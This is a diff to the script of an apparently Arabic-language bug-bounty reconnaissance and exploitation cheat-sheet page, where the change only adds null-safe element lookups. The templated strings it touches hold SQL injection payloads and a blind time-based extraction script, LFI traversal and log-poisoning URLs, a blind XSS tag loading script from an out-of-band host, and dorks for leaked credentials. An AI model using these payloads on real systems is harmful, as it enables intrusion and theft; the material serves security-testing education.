@@ -1555,57 +1555,57 @@ http://spoof.127.0.0.1.nip.io</pre>
       const oob = document.getElementById('in-oob').value.trim() || 'hunter-oob.com';
       
       // Update Interactsh
-      document.getElementById('cmd-oob').innerHTML = `# تنصيب خادم interactsh على الـ VPS الخاص بك\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest\n\n# تشغيل الخادم والإنصات للطلبات\ninteractsh-server -domain ${oob} -listen-ip ${vps}`;
+      (document.getElementById('cmd-oob') || {}).innerHTML = `# تنصيب خادم interactsh على الـ VPS الخاص بك\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest\n\n# تشغيل الخادم والإنصات للطلبات\ninteractsh-server -domain ${oob} -listen-ip ${vps}`;
       
       // Update ASN
-      document.getElementById('cmd-asn').innerHTML = `# البحث عن أرقام ASN الخاصة بالنطاق عبر amass\namass intel -org ${domain}\n\n# معرفة نطاق الآي بي (CIDR) الخاص برقم ASN المكتشف\nwhois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u`;
+      (document.getElementById('cmd-asn') || {}).innerHTML = `# البحث عن أرقام ASN الخاصة بالنطاق عبر amass\namass intel -org ${domain}\n\n# معرفة نطاق الآي بي (CIDR) الخاص برقم ASN المكتشف\nwhois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u`;
       
       // Update Google Dorks
-      document.getElementById('cmd-dorks').innerHTML = `# البحث عن لوحات تحكم وملفات تكوين مستثنى منها الموقع الرئيسي\nsite:*.${domain} -site:www.${domain} inurl:login OR inurl:admin\nsite:*.${domain} ext:txt OR ext:env OR ext:bak OR ext:sql OR ext:conf`;
+      (document.getElementById('cmd-dorks') || {}).innerHTML = `# البحث عن لوحات تحكم وملفات تكوين مستثنى منها الموقع الرئيسي\nsite:*.${domain} -site:www.${domain} inurl:login OR inurl:admin\nsite:*.${domain} ext:txt OR ext:env OR ext:bak OR ext:sql OR ext:conf`;
       
       // Update Passive Recon
-      document.getElementById('cmd-crt').innerHTML = `# استخلاص النطاقات الفرعية من crt.sh\ncurl -s "https://crt.sh/?q=%25.${domain}&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crt_subs.txt`;
-      document.getElementById('cmd-subfinder').innerHTML = `# تشغيل الفحص السلبي المدمج\nsubfinder -d ${domain} -all -recursive -o subfinder_subs.txt`;
+      (document.getElementById('cmd-crt') || {}).innerHTML = `# استخلاص النطاقات الفرعية من crt.sh\ncurl -s "https://crt.sh/?q=%25.${domain}&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crt_subs.txt`;
+      (document.getElementById('cmd-subfinder') || {}).innerHTML = `# تشغيل الفحص السلبي المدمج\nsubfinder -d ${domain} -all -recursive -o subfinder_subs.txt`;
       
       // Update Active Recon
-      document.getElementById('cmd-pure').innerHTML = `# تخمين النطاقات الفرعية نشطاً\npuredns bruteforce wordlist.txt ${domain} -r trusted_resolvers.txt -o active_subs.txt`;
+      (document.getElementById('cmd-pure') || {}).innerHTML = `# تخمين النطاقات الفرعية نشطاً\npuredns bruteforce wordlist.txt ${domain} -r trusted_resolvers.txt -o active_subs.txt`;
       
       // Update Port Scanning & Fuzzing
-      document.getElementById('cmd-httpx').innerHTML = `cat subs.txt | httpx -title -status-code -content-length -tech-detect -o web_targets.txt`;
-      document.getElementById('cmd-masscan').innerHTML = `# تحويل أسماء النطاقات إلى IPs\ncat subs.txt | dnsx -a -resp-only -o ips.txt\n\n# فحص المنافذ الـ 65535 كاملة بمعدل 2000 حزمة في الثانية\nmasscan -iL ips.txt -p1-65535 --rate 2000 -oG masscan_results.txt`;
-      document.getElementById('cmd-ffuf').innerHTML = `ffuf -w SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://${domain}/FUZZ -mc 200,301,302,403 -e .php,.zip,.bak,.git,.env -t 40`;
-      document.getElementById('cmd-gitdumper').innerHTML = `# سحب مجلد git المفتوح\ngit-dumper https://${domain}/.git/ local_repo/\n\n# فحص تاريخ الالتزامات (Commits) للبحث عن كلمات مرور أو مفاتيح مسربة\ncd local_repo\ngit log -p`;
+      (document.getElementById('cmd-httpx') || {}).innerHTML = `cat subs.txt | httpx -title -status-code -content-length -tech-detect -o web_targets.txt`;
+      (document.getElementById('cmd-masscan') || {}).innerHTML = `# تحويل أسماء النطاقات إلى IPs\ncat subs.txt | dnsx -a -resp-only -o ips.txt\n\n# فحص المنافذ الـ 65535 كاملة بمعدل 2000 حزمة في الثانية\nmasscan -iL ips.txt -p1-65535 --rate 2000 -oG masscan_results.txt`;
+      (document.getElementById('cmd-ffuf') || {}).innerHTML = `ffuf -w SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://${domain}/FUZZ -mc 200,301,302,403 -e .php,.zip,.bak,.git,.env -t 40`;
+      (document.getElementById('cmd-gitdumper') || {}).innerHTML = `# سحب مجلد git المفتوح\ngit-dumper https://${domain}/.git/ local_repo/\n\n# فحص تاريخ الالتزامات (Commits) للبحث عن كلمات مرور أو مفاتيح مسربة\ncd local_repo\ngit log -p`;
       
       // Update Github Recon
-      document.getElementById('cmd-gitdorks').innerHTML = `"${domain}" API_key\n"${domain}" password\n"${domain}" oauth_token\n"${domain}" JDBC_connection`;
+      (document.getElementById('cmd-gitdorks') || {}).innerHTML = `"${domain}" API_key\n"${domain}" password\n"${domain}" oauth_token\n"${domain}" JDBC_connection`;
       
       // Update CMS Hacking & SQLi
-      document.getElementById('cmd-wpscan').innerHTML = `# فحص شامل وصامت مع تدوير الـ User-Agent واستخدام مفتاح للثغرات\nwpscan --url https://${domain} --enumerate vp,vt,u --random-user-agent --api-token YOUR_WPSEC_TOKEN`;
-      document.getElementById('cmd-sqli-union').innerHTML = `# تخمين عدد الأعمدة\nhttp://${domain}/item.php?id=1 ORDER BY 1--\nhttp://${domain}/item.php?id=1 ORDER BY 5-- (إذا ظهر خطأ فالأعمدة أقل من 5)\n\n# استدعاء البيانات وتحديد الأعمدة التي تعرض محتوى على الصفحة\nhttp://${domain}/item.php?id=-1 UNION SELECT 1,2,3,4--`;
-      document.getElementById('cmd-sqli-python').innerHTML = `import requests\nimport time\n\nurl = "http://${domain}/item.php?id=1"\nextracted_db_name = ""\n\nfor i in range(1, 15):\n    for char in "abcdefghijklmnopqrstuvwxyz_0123456789":\n        payload = f" AND IF(SUBSTRING(database(),{i},1)='{char}', SLEEP(5), 0)"\n        start_time = time.time()\n        r = requests.get(url + payload)\n        if time.time() - start_time >= 5:\n            extracted_db_name += char\n            print(f"[+] Extracted: {extracted_db_name}")\n            break`;
-      document.getElementById('cmd-sqlmap').innerHTML = `sqlmap -u "http://${domain}/item.php?id=1" --tamper=space2comment,between,randomcase --dbms=mysql --random-agent -v 3`;
+      (document.getElementById('cmd-wpscan') || {}).innerHTML = `# فحص شامل وصامت مع تدوير الـ User-Agent واستخدام مفتاح للثغرات\nwpscan --url https://${domain} --enumerate vp,vt,u --random-user-agent --api-token YOUR_WPSEC_TOKEN`;
+      (document.getElementById('cmd-sqli-union') || {}).innerHTML = `# تخمين عدد الأعمدة\nhttp://${domain}/item.php?id=1 ORDER BY 1--\nhttp://${domain}/item.php?id=1 ORDER BY 5-- (إذا ظهر خطأ فالأعمدة أقل من 5)\n\n# استدعاء البيانات وتحديد الأعمدة التي تعرض محتوى على الصفحة\nhttp://${domain}/item.php?id=-1 UNION SELECT 1,2,3,4--`;
+      (document.getElementById('cmd-sqli-python') || {}).innerHTML = `import requests\nimport time\n\nurl = "http://${domain}/item.php?id=1"\nextracted_db_name = ""\n\nfor i in range(1, 15):\n    for char in "abcdefghijklmnopqrstuvwxyz_0123456789":\n        payload = f" AND IF(SUBSTRING(database(),{i},1)='{char}', SLEEP(5), 0)"\n        start_time = time.time()\n        r = requests.get(url + payload)\n        if time.time() - start_time >= 5:\n            extracted_db_name += char\n            print(f"[+] Extracted: {extracted_db_name}")\n            break`;
+      (document.getElementById('cmd-sqlmap') || {}).innerHTML = `sqlmap -u "http://${domain}/item.php?id=1" --tamper=space2comment,between,randomcase --dbms=mysql --random-agent -v 3`;
       
       // Update LFI
-      document.getElementById('cmd-lfi-path').innerHTML = `# فلاتر وتجاوزات قراءة الملفات\nhttp://${domain}/view.php?file=../../../../etc/passwd\nhttp://${domain}/view.php?file=....//....//....//etc/passwd (تخطي فلتر استبدال ../ بـ فراغ)\nhttp://${domain}/view.php?file=%252e%252e%252f%252e%252e%252fetc/passwd (تخطي الفلتر بالترميز المزدوج)`;
-      document.getElementById('cmd-lfi-wrapper').innerHTML = `http://${domain}/view.php?file=php://filter/read=convert.base64-encode/resource=config.php`;
-      document.getElementById('cmd-lfi-poison').innerHTML = `http://${domain}/view.php?file=../../../../var/log/apache2/access.log&cmd=id`;
+      (document.getElementById('cmd-lfi-path') || {}).innerHTML = `# فلاتر وتجاوزات قراءة الملفات\nhttp://${domain}/view.php?file=../../../../etc/passwd\nhttp://${domain}/view.php?file=....//....//....//etc/passwd (تخطي فلتر استبدال ../ بـ فراغ)\nhttp://${domain}/view.php?file=%252e%252e%252f%252e%252e%252fetc/passwd (تخطي الفلتر بالترميز المزدوج)`;
+      (document.getElementById('cmd-lfi-wrapper') || {}).innerHTML = `http://${domain}/view.php?file=php://filter/read=convert.base64-encode/resource=config.php`;
+      (document.getElementById('cmd-lfi-poison') || {}).innerHTML = `http://${domain}/view.php?file=../../../../var/log/apache2/access.log&cmd=id`;
       
       // Update Blind XSS
-      document.getElementById('cmd-xss-blind').innerHTML = `&lt;script src="https://${oob}/log.js"&gt;&lt;/script&gt;`;
+      (document.getElementById('cmd-xss-blind') || {}).innerHTML = `&lt;script src="https://${oob}/log.js"&gt;&lt;/script&gt;`;
       
       // Update Cheat Sheet Table cells
-      document.getElementById('td-subfinder').innerHTML = `<code>subfinder -d ${domain} -all -recursive -o subs.txt</code>`;
-      document.getElementById('td-pure').innerHTML = `<code>puredns bruteforce wordlist.txt ${domain} -r resolvers.txt -o active.txt</code>`;
-      document.getElementById('td-ffuf').innerHTML = `<code>ffuf -w wordlist.txt -u https://${domain}/FUZZ -mc 200,301,302,403</code>`;
-      document.getElementById('td-gitdumper').innerHTML = `<code>git-dumper https://${domain}/.git/ local_repo/</code>`;
-      document.getElementById('td-lfi-wrapper').innerHTML = `<code>php://filter/read=convert.base64-encode/resource=config.php</code>`;
+      (document.getElementById('td-subfinder') || {}).innerHTML = `<code>subfinder -d ${domain} -all -recursive -o subs.txt</code>`;
+      (document.getElementById('td-pure') || {}).innerHTML = `<code>puredns bruteforce wordlist.txt ${domain} -r resolvers.txt -o active.txt</code>`;
+      (document.getElementById('td-ffuf') || {}).innerHTML = `<code>ffuf -w wordlist.txt -u https://${domain}/FUZZ -mc 200,301,302,403</code>`;
+      (document.getElementById('td-gitdumper') || {}).innerHTML = `<code>git-dumper https://${domain}/.git/ local_repo/</code>`;
+      (document.getElementById('td-lfi-wrapper') || {}).innerHTML = `<code>php://filter/read=convert.base64-encode/resource=config.php</code>`;
 
       // Update Terminals output simulators
-      document.getElementById('sim-oob').innerHTML = `[INF] interactsh-server starting...\n[INF] DNS Server listening on port 53\n[INF] HTTP Server listening on port 80\n[INF] HTTPS Server listening on port 443\n[INF] Waiting for OAST interactions on domain ${oob}\n[DNS] Received query for A from 12.34.56.78\n[HTTP] Received callback GET /log.js from ${domain}`;
-      document.getElementById('sim-asn').innerHTML = `[ASN] Querying ranges for domain: ${domain}\nASN Range discovered: AS12345 (Example Corp)\nCIDR Block: 104.244.42.0/24\nCIDR Block: 192.168.1.0/24`;
-      document.getElementById('sim-subfinder').innerHTML = `[INF] Enumerating subdomains for ${domain}\n[INF] Found 142 subdomains for ${domain}\napi.${domain}\ndev.${domain}\nadmin.${domain}\nstaging.${domain}`;
-      document.getElementById('sim-httpx').innerHTML = `https://api.${domain} [200 OK] [1450 bytes] [API Endpoint] [nginx, Node.js]\nhttps://dev.${domain} [403 Forbidden] [230 bytes] [Apache]\nhttps://admin.${domain} [302 Redirect] [0 bytes] [IIS]`;
-      document.getElementById('sim-ffuf').innerHTML = `:: Progress: [11242/11242] :: Job [1/1] :: 450 req/sec ::\n.git/                   [Status: 301, Size: 0, Words: 0]\n.env                    [Status: 200, Size: 412, Words: 12]\nconfig.php.bak          [Status: 200, Size: 1205, Words: 50]`;
+      (document.getElementById('sim-oob') || {}).innerHTML = `[INF] interactsh-server starting...\n[INF] DNS Server listening on port 53\n[INF] HTTP Server listening on port 80\n[INF] HTTPS Server listening on port 443\n[INF] Waiting for OAST interactions on domain ${oob}\n[DNS] Received query for A from 12.34.56.78\n[HTTP] Received callback GET /log.js from ${domain}`;
+      (document.getElementById('sim-asn') || {}).innerHTML = `[ASN] Querying ranges for domain: ${domain}\nASN Range discovered: AS12345 (Example Corp)\nCIDR Block: 104.244.42.0/24\nCIDR Block: 192.168.1.0/24`;
+      (document.getElementById('sim-subfinder') || {}).innerHTML = `[INF] Enumerating subdomains for ${domain}\n[INF] Found 142 subdomains for ${domain}\napi.${domain}\ndev.${domain}\nadmin.${domain}\nstaging.${domain}`;
+      (document.getElementById('sim-httpx') || {}).innerHTML = `https://api.${domain} [200 OK] [1450 bytes] [API Endpoint] [nginx, Node.js]\nhttps://dev.${domain} [403 Forbidden] [230 bytes] [Apache]\nhttps://admin.${domain} [302 Redirect] [0 bytes] [IIS]`;
+      (document.getElementById('sim-ffuf') || {}).innerHTML = `:: Progress: [11242/11242] :: Job [1/1] :: 450 req/sec ::\n.git/                   [Status: 301, Size: 0, Words: 0]\n.env                    [Status: 200, Size: 412, Words: 12]\nconfig.php.bak          [Status: 200, Size: 1205, Words: 50]`;
     }
 
     function copyCode(btn) {
